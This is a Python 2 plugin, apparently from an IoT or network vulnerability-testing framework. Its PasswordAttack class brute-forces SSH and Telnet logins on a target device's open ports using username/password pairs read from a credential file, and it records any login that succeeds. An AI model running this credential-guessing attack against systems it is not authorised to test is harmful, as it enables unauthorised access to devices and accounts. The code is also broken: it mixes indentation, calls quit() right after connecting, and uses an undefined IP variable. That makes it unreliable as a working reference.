from generic_attack import *
import logging
log = logging.getLogger(__name__)
from pexpect import  pxssh
import csv
import telnetlib

class PasswordAttack(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(PasswordAttack, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):
        self.running = True
        target = self.device['ip']

        if self.device["vulnerable_ports"] is None:
            result.update({"status": "no open ports"})
            return

        if "tcp" not in self.device["vulnerable_ports"].keys():
            result.update({"status": "no open ports"})
            return

        if "open" not in self.device["vulnerable_ports"]["tcp"].keys():
            result.update({"status": "no open ports"})
            return

        """ Send packets
                """

        openPorts = self.device["vulnerable_ports"]["tcp"]["open"]

        #SSH Attack
        credential_file = self.config["credential_file_path"]
        sshStatus = self.ssh_attack(target, openPorts, credential_file)
        telnetStatus = self.telnet_attack(target, openPorts, credential_file)
        if sshStatus["status"] or telnetStatus["status"]:
            result.update({"status":"vulnerable"})
        result.update({"ssh_status": sshStatus["status"]})
	if sshStatus["status"]:	
		result.update({"ssh_port": sshStatus["port"]})
		result.update({"ssh_username": sshStatus["username"]})
		result.update({"ssh_password": sshStatus["password"]})
        result.update({"telnet_status": telnetStatus["status"]})
	if telnetStatus["status"]:	
		result.update({"telnet_port": telnetStatus["port"]})
		result.update({"telnet_username": telnetStatus["username"]})
		result.update({"telnet_password": telnetStatus["password"]})
        return

    def telnet_attack(self, victim, port_list, credential_file):
        host = victim
        login_file = csv.reader(open(credential_file, "rb"), delimiter="\t")
        login_list = list(zip(*login_file))
        usernames = login_list[0]
        passwords = login_list[1]
	timeout = 10

        for port in port_list:
            counter = 0
            while counter < len(usernames):
                user = usernames[counter]
                password = passwords[counter]
                try:
                    tn = telnetlib.Telnet(host, port, timeout)
                    quit()
                    tn.read_until("login: ")
                    tn.write(user + "\n")
                    tn.read_until("Password: ")
                    tn.write(password + "\n")
                    print tn.read_all()
                    return {"status":True, "port":port, "username":usernames[counter], "password":passwords[counter]}
                except:
                    pass
                    print "Failed telnet on port", port, "with user:", user, "and password:", password
                counter += 1

        return {"status":False}

    def ssh_attack(self, victim, port_list, credential_file):
        login_file = csv.reader(open(credential_file, "rb"), delimiter="\t")
        login_list = list(zip(*login_file))
        usernames = login_list[0]
        passwords = login_list[1]

        for p in port_list:
            counter = 0
	    port = "port=" + str(p)
            while counter < len(usernames):
		try:
			ssh = pxssh.pxssh()
			response = ""
			ssh.login(IP, usernames[counter], passwords[counter], port)
			ssh.sendline("uptime")
			ssh.prompt()
			response = ssh.before
			if response != "":
				return {"status":True, "port":p, "username":usernames[counter], "password":passwords[counter]}
			ssh.logout()
		except pxssh.ExceptionPxssh, e:
			pass
        return {"status":False}

    def shutdown(self):
        self.running = False

    def prerequisite(self):
        return ["PortVulnerabilityTest"]
